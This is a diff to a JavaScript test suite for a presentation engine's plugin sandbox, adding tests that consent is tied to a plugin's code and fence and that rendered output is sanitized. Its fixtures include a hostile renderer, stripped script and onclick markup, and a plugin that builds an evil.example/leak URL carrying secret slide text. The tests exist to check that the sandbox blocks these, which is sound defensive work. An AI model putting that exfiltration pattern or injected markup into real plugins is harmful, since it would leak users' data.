@@ -35,7 +35,7 @@ const home = fs.mkdtempSync(path.join(os.tmpdir(), 'lattice-fence-home-'));
 process.env.LATTICE_HOME = home;
 const engine = require('../../../lib/engine');
 const { renderWithCodePackages } = require('../../../lib/packages/code-door.js');
-const { codeDigest, grantTrust } = require('../../../lib/packages/trust.js');
+const { pluginDigest, codeDigest, grantTrust } = require('../../../lib/packages/trust.js');
 
 /** The stranger's renderer: tries the network, then returns markup carrying every thing a fence output must lose. */
 const hostile = (H, P) => `
@@ -79,12 +79,13 @@ after(() => {
   fs.rmSync(home, { recursive: true, force: true });
 });
 
-const plugin = (code, over = {}) => ({ name: 'gantt-plugin', fence: 'gantt', code, sha256: codeDigest({ roles: { 'render.js': 'r' }, files: { r: code } }), ...over });
-const approve = (p) => grantTrust('plugin', p.name, p.sha256, { layer: null });
+const plugin = (code, over = {}) => ({ name: 'gantt-plugin', fence: 'gantt', code, ...over });
+/** What consent is pinned to: the code AND the fence (trust.js `pluginDigest`). */
+const approve = (p) => grantTrust('plugin', p.name, pluginDigest(p.code, p.fence), { layer: null });
 const run = (p, md = DECK, extra = {}) => {
   const e = engine.createEngine();
   const lines = { warn: [], info: [] };
-  const r = renderWithCodePackages((hook) => e.render(md, 'indaco', { codePackages: hook }), {
+  const r = renderWithCodePackages((hook, more) => e.render(md, 'indaco', { codePackages: hook, ...more }), {
     packages: [],
     plugins: [p],
     executablePath: process.env.CHROME_PATH || undefined,
@@ -103,7 +104,7 @@ describe('the fence door through the real sandbox', () => {
     const r = run(p);
     assert.equal(r.rendered, undefined);
     assert.equal(r.refusal.length, 1);
-    assert.match(r.refusal[0], new RegExp(`the plugin gantt-plugin, and you have not approved its code \\(sha256 ${p.sha256}\\)`));
+    assert.match(r.refusal[0], new RegExp(`the plugin gantt-plugin, and you have not approved its code \\(sha256 ${pluginDigest(p.code, p.fence)}\\)`));
     assert.match(r.refusal[0], /lattice packages trust plugin\/gantt-plugin/);
     await settle();
     assert.deepEqual(hits, [], 'nothing ran, so nothing reached the server');
@@ -117,7 +118,7 @@ describe('the fence door through the real sandbox', () => {
     assert.equal(r.refusal, undefined, JSON.stringify(r.refusal));
     const html = r.rendered.html;
     const root = /<div data-lattice-plugin="gantt-plugin">([\s\S]*?)<\/div>\s*<\/div>/.exec(html)?.[0] ?? '';
-    assert.match(root, /<ul class="gantt-plugin-rows" id="gantt-plugin-s0f0">/, 'its own class and id stay, the foreign class goes');
+    assert.match(root, /<ul class="gantt-plugin-rows" id="gantt-plugin-[0-9a-f]{8}-0">/, 'its own class and id stay, the foreign class goes');
     assert.match(root, /<li>Design 1 &lt; 2<\/li><li>Build 3<\/li>/, 'it was handed the fence’s text as written');
     assert.doesNotMatch(html, /foreign-class|onclick|alert\(|<script|127\.0\.0\.1|not-mine/, 'a stranger’s class, handler, script, address and id are gone');
     assert.match(html, /language-js/, 'a fence of another language is still code');
@@ -162,11 +163,81 @@ describe('the fence door through the real sandbox', () => {
     approve(p);
     const tally = { name: 'tally', code: 'function t(s){return s.html}\nexport { t as default };', facts: 1 };
     const e = engine.createEngine();
-    const r = renderWithCodePackages((hook) => e.render(md, 'indaco', { codePackages: hook }), { packages: [tally], plugins: [p], executablePath: process.env.CHROME_PATH || undefined, warn: () => {}, info: () => {} });
+    const r = renderWithCodePackages((hook, more) => e.render(md, 'indaco', { codePackages: hook, ...more }), { packages: [tally], plugins: [p], executablePath: process.env.CHROME_PATH || undefined, warn: () => {}, info: () => {} });
     // The package is not approved either, so the render stops before anything runs: that is the
     // point: only the slide package was claimed, the plugin's fence never was.
     assert.deepEqual(r.claimed, ['tally']);
     await settle();
     assert.deepEqual(hits, []);
+  });
+
+  test('CONSENT IS PINNED TO THE CODE THAT RUNS, not to a hash the caller states', { timeout: TIMEOUT }, async () => {
+    hits = [];
+    const good = plugin('function render(){return "<p>good</p>"}\nexport { render as default };');
+    approve(good);
+    // The same name and fence, different code: the caller can state nothing that gets it past the door.
+    const evil = plugin(hostile(H, P), { sha256: pluginDigest(good.code, good.fence) });
+    const r = run(evil);
+    assert.equal(r.rendered, undefined, 'approved code’s hash on other code is not approval');
+    assert.match(r.refusal[0], /you have not approved its code/);
+    await settle();
+    assert.deepEqual(hits, []);
+  });
+
+  test('CONSENT NAMES THE FENCE: the same renderer on another fence is a new approval', { timeout: TIMEOUT }, () => {
+    const code = 'function render(){return "<p>x</p>"}\nexport { render as default };';
+    approve(plugin(code, { fence: 'map' }));
+    const r = run(plugin(code, { fence: 'gantt' }));
+    assert.equal(r.rendered, undefined);
+    assert.match(r.refusal[0], /you have not approved its code/);
+  });
+
+  test('TWO PLUGINS, ONE FENCE: neither draws it, and the door says so', { timeout: TIMEOUT }, () => {
+    const code = 'function render(){return "<p>drawn</p>"}\nexport { render as default };';
+    const a = plugin(code, { name: 'a-plugin' });
+    const b = plugin(code, { name: 'b-plugin' });
+    approve(a);
+    approve(b);
+    const e = engine.createEngine();
+    const warn = [];
+    const r = renderWithCodePackages((hook, more) => e.render(DECK, 'indaco', { codePackages: hook, ...more }), { packages: [], plugins: [a, b], executablePath: process.env.CHROME_PATH || undefined, warn: (l) => warn.push(l), info: () => {} });
+    assert.match(r.rendered.html, /language-gantt/, 'the block stays code');
+    assert.doesNotMatch(r.rendered.html, /data-lattice-plugin/);
+    assert.ok(warn.some((l) => /a-plugin and b-plugin both declare the fence `gantt`/.test(l)), warn.join('\n'));
+  });
+
+  test('A COMPONENT AND A PLUGIN OF ONE NAME are two packages: each runs its own code, each needs its own approval', { timeout: TIMEOUT }, () => {
+    const md = '---\ntheme: indaco\n---\n\n<!-- _class: same -->\n\n## Slide\n\n- 1\n\n---\n\n## Fence\n\n```gantt\nrows\n```\n';
+    const comp = { name: 'same', code: 'function t(s){return s.html.replace("<li>1</li>","<li>COMPONENT</li>")}\nexport { t as default };', facts: 1 };
+    const plug = plugin('function render(f){return "<p>PLUGIN "+f.body.trim()+"</p>"}\nexport { render as default };', { name: 'same' });
+    grantTrust('component', 'same', codeDigest({ roles: { 'transform.js': 't' }, files: { t: comp.code } }), { layer: null });
+    approve(plug);
+    const e = engine.createEngine();
+    const r = renderWithCodePackages((hook, more) => e.render(md, 'indaco', { codePackages: hook, ...more }), { packages: [comp], plugins: [plug], executablePath: process.env.CHROME_PATH || undefined, warn: () => {}, info: () => {} });
+    assert.equal(r.refusal, undefined, JSON.stringify(r.refusal));
+    assert.match(r.rendered.html, /COMPONENT/);
+    assert.match(r.rendered.html, /PLUGIN rows/);
+  });
+
+  test('NESTED SECTION and EMPTY OUTPUT are refused, each with its own reason, and the block stays', { timeout: TIMEOUT }, () => {
+    const nested = plugin('function render(){return "<section class=\\"gantt-plugin\\"><h2>FORGED</h2></section>"}\nexport { render as default };');
+    approve(nested);
+    let r = run(nested);
+    assert.match(r.rendered.html, /did not draw this block: the renderer returned a &lt;section&gt;/);
+    assert.doesNotMatch(r.rendered.html, /FORGED/);
+    const empty = plugin('function render(){return "<noscript>x</noscript>"}\nexport { render as default };');
+    approve(empty);
+    r = run(empty);
+    assert.match(r.rendered.html, /did not draw this block: the renderer returned nothing the sanitizer kept/);
+  });
+
+  test('A FENCE ON A SLIDE A LATER PASS REBUILDS: the plugin’s text never becomes an address', { timeout: TIMEOUT }, async () => {
+    hits = [];
+    const md = '---\ntheme: indaco\n---\n\n<!-- _class: video -->\n\n## Clip\n\n- https://www.youtube.com/watch?v=dQw4w9WgXcQ\n\n```gantt\nSECRET-Q3-NUMBERS\n```\n';
+    const p = plugin(`function render(f){return "<ul><li>https://evil.example/leak?d="+encodeURIComponent(f.body)+" <code>poster</code></li></ul>"}\nexport { render as default };`);
+    approve(p);
+    const r = run(p, md);
+    assert.match(r.rendered.html, /data-lattice-plugin="gantt-plugin"/);
+    assert.doesNotMatch(r.rendered.html.replace(/<div data-lattice-plugin[\s\S]*?<\/div>/, ''), /evil\.example|SECRET-Q3/, 'the video pass did not read the plugin’s bullet');
   });
 });
